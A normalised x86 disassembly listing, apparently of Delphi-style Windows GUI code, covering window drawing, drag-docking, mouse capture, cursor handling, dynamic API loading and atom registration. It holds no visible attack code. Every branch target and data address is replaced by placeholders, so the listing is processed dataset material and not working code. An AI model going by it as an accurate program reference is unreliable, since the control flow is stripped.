inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_441598
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43c5f0
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4417bb
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_441610
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44180c
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
sub_441814
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43ff64
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43ff8c
call sub_441814
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43ff64
call sub_441814
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_43f994
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_43fe8c
mov edx eax
mov eax ebx
call sub_43feb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43feb4
jmp r-xdata
sub_44189c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_441814
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4418e0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43fe8c
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_43feb4
sub_441910
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43db40
mov edx eax
mov eax [ rw-data ]
call sub_442470
mov eax [ ebx + 0x14 ]
call sub_43db40
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_441a24
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_441970
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_442470
mov eax ebx
call sub_441a24
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_43feb4
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_43feb4
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44189c
push ebx
push sub_441a14
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_440240
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4419ec
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_43c5dc
test eax eax
jle r-xdata
push ebx
push sub_441a14
xor edx edx
mov eax ebx
call sub_440240
sub_441a24
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_43fa58
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_43fa58
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_43fac4
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_43fac4
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41ca38
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_441b10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_441b10
pop ecx
mov eax ebx
call sub_43fe8c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fe8c
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_441b10
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43fe8c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_421ba8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_441ba0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fe8c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_43fa10
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_43fe8c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_441b10
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441bf0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_436cf8
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_436cf8
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_441c6c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43f91c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_43f9c8
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_43ff70
test eax eax
je r-xdata
mov eax esi
call sub_43f994
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_441a14
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_440240
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43ff70
mov edx [ ebx + 0x20 ]
call sub_43fec8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_441c6c
pop ecx
sub_441cec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43f978
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_43f978
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_43ff70
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_441cec
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_441a14
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_440240
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_43fb74
mov eax edi
call sub_43ff64
test eax eax
je r-xdata
mov eax edi
call sub_43ff70
mov esi eax
mov eax esi
call sub_43fe8c
push eax
mov eax esi
call sub_43f9c8
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_43ff64
call sub_43fe8c
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_43fe8c
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_43feb4
mov eax esi
call sub_43fe8c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43feb4
mov eax edi
call sub_43ff70
call sub_43ff04
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_43f9c8
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43feb4
mov eax edi
call sub_43ff64
call sub_43ff04
mov bl 0x1
jmp r-xdata
sub_441e24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4401d8
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_4123e4
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4409cc
test eax eax
je r-xdata
push ebp
call sub_441c6c
pop ecx
push ebp
call sub_441cec
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_441bf0
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_441eac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_43fa58
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_43fa58
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_441ba0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_441ba0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_441f3c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406850
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4409cc
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_441970
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406850
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4409cc
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_436e9c
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44231b
lea eax [ ebp - 0x48 ]
call sub_403f6c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43db40
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_435bb8
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_438058
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f6c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_441e24
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43c670
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_441a24
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406850
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_441eac
pop ecx
mov eax [ ebp - 0x4 ]
call sub_441a24
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406850
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4409cc
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_437278
jmp r-xdata
mov eax edi
call sub_4536c0
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4409cc
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_436cf8
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_437358
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fc0
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441910
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454dc0
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43db40
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_437a00
jmp r-xdata
sub_442324
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_442498
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_4423b4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_442470
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_442418
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_442448
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406944
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_442470
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4423e4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_442498
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4423fc
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_442418
pop ebx
retn
mov eax ebx
call sub_442448
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4424fc
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_442780
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_442764
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_442764
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_442870
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403234
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403234
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403234
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403234
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f6c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f6c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4428f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408a20
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fc0
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a20
mov edx [ ebp - 0x10 ]
